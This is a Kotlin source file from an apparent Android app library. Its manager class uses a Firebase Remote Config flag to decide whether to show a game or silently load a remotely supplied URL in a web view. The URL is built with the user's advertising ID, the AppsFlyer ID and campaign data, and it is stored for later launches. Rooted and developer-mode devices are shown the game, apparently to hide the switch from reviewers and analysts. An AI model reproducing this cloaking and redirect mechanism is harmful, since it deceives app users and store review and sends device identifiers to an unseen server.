package io.likes.library.managers

import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import androidx.core.net.toUri
import androidx.lifecycle.lifecycleScope
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.applinks.AppLinkData
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import io.likes.library.FormBuilder

import io.likes.library.callbacks.MainCallback
import io.likes.library.storage.persistroom.model.Model
import io.likes.library.utils.Utils
import io.likes.library.utils.Utils.getAdvId
import com.onesignal.OneSignal
import io.likes.library.MainView
import io.likes.library.utils.Utils.isDevMode
import io.likes.library.utils.Utils.isDeviceRooted
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.*
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine

@InternalCoroutinesApi
class MainManager(private val activity: AppCompatActivity) {


    fun initialize() {

        var remoteListenerCallback = activity as MainCallback

        val configSettings = remoteConfigSettings {
            minimumFetchIntervalInSeconds = 3600
        }


        Firebase.remoteConfig.setConfigSettingsAsync(configSettings)

        Firebase.remoteConfig.fetchAndActivate().addOnCompleteListener(activity) { task ->


            if (task.isSuccessful) {

                OneSignal.initWithContext(activity.applicationContext)
                OneSignal.setAppId(Firebase.remoteConfig.getString("onesignal"))




                when (Firebase.remoteConfig.getString("status")) {
                    "false" -> {

                        remoteListenerCallback.startGame()

                    }

                    "true" -> {


                        val list = FormBuilder.createRepoInstance(activity).getAllData()

                        if (list.isNotEmpty()) {

                            activity.startActivity(
                                Intent(activity, MainView::class.java).putExtra(
                                    "url",
                                    list.component1().link
                                )
                            )
                            activity.finish()

                        } else if (list.isEmpty()) {



                            //

                            if (isDeviceRooted || isDevMode(activity = activity)) {
                                remoteListenerCallback.startGame()
                            }


                            activity.lifecycleScope.launch(Dispatchers.IO) {

                                setupMainCycle()

                            }

                        } else {



                            //isDeviceRooted || isDevMode(activity = activity)

                            if (isDeviceRooted || isDevMode(activity = activity)) {
                                remoteListenerCallback.startGame()
                            }


                            activity.lifecycleScope.launch(Dispatchers.IO) {

                                setupMainCycle()

                            }

                        }






                    }

                }
            } else {

                remoteListenerCallback.startGame()

            }

        }

    }


    suspend fun setupMainCycle() {

        val resourceOneFlow = flow {

            emit(requestAppsData())
        }

        val resourceTwoFlow = flow {

            emit(requestDeep())
        }


        val requestsResultFlow = resourceOneFlow.zip(resourceTwoFlow) { data, deep ->


            if (deep != "null") {

                Firebase.remoteConfig.getString("links").toUri().buildUpon().apply {
                    appendQueryParameter("sub12", Utils.getAppBundle(activity))
                    appendQueryParameter("afToken", Firebase.remoteConfig.getString("apps"))
                    appendQueryParameter(
                        "afid",
                        AppsFlyerLib.getInstance().getAppsFlyerUID(activity)
                    )
                    appendQueryParameter("sub11", "facebook")
                    appendQueryParameter("media_source", "facebook")
                    appendQueryParameter("advertising_id", getAdvId(activity))
                    appendQueryParameter("triger", Utils.concatCampaign(deep))

                }


            } else if (data?.get("campaign").toString() != "null") {

                Firebase.remoteConfig.getString("links").toUri().buildUpon().apply {

                    appendQueryParameter("app_id", Utils.getAppBundle(activity))
                    appendQueryParameter("aftoken", Firebase.remoteConfig.getString("apps"))
                    appendQueryParameter(
                        "afid",
                        AppsFlyerLib.getInstance().getAppsFlyerUID(activity)
                    )
                    appendQueryParameter("sub11", data?.get("af_c_id").toString())
                    appendQueryParameter("&media_source", data?.get("media_source").toString())
                    appendQueryParameter("advertising_id", getAdvId(activity))
                    appendQueryParameter(
                        "triger",
                        Utils.concatCampaign(data?.get("campaign").toString())
                    )

                }


            } else {

                Firebase.remoteConfig.getString("links").toUri().buildUpon().apply {
                    appendQueryParameter("app_id", Utils.getAppBundle(activity))
                    appendQueryParameter("af_status", "organic")
                    appendQueryParameter("aftoken", Firebase.remoteConfig.getString("apps"))
                    appendQueryParameter(
                        "afid",
                        AppsFlyerLib.getInstance().getAppsFlyerUID(activity)
                    )


                }
            }

        }



        requestsResultFlow.collect { length ->

            FormBuilder.createRepoInstance(activity).insert(Model(1, length.toString()))

            activity.startActivity(
                Intent(activity, MainView::class.java).putExtra(
                    "url",
                    length.toString()
                )
            )
            activity.finish()

        }


    }


    @OptIn(ExperimentalCoroutinesApi::class)
    suspend fun requestAppsData(): MutableMap<String, Any>? =
        suspendCancellableCoroutine { cont ->
            GlobalScope.launch {
                cont.resume(getsPromt(activity))
            }


        }


    suspend fun getsPromt(activity: AppCompatActivity): MutableMap<String, Any>? = suspendCoroutine {

        AppsFlyerLib.getInstance().init(
            Firebase.remoteConfig.getString("apps"),
            object: AppsFlyerConversionListener {
                override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {

                 it.resume(data)

                }

                override fun onConversionDataFail(error: String?) {
                }

                override fun onAppOpenAttribution(data: MutableMap<String, String>?) {
                    data?.map {

                    }
                }

                override fun onAttributionFailure(error: String?) {

                }
            },
            activity
        )
        AppsFlyerLib.getInstance().start(activity)

    }

    suspend fun requestDeep(): String =
        suspendCancellableCoroutine { cont ->
            AppLinkData.fetchDeferredAppLinkData(activity) {


                if (it != null) {

                    cont.resume(it.targetUri.toString())

                } else {

                    cont.resume("null")

                }

            }
        }


}

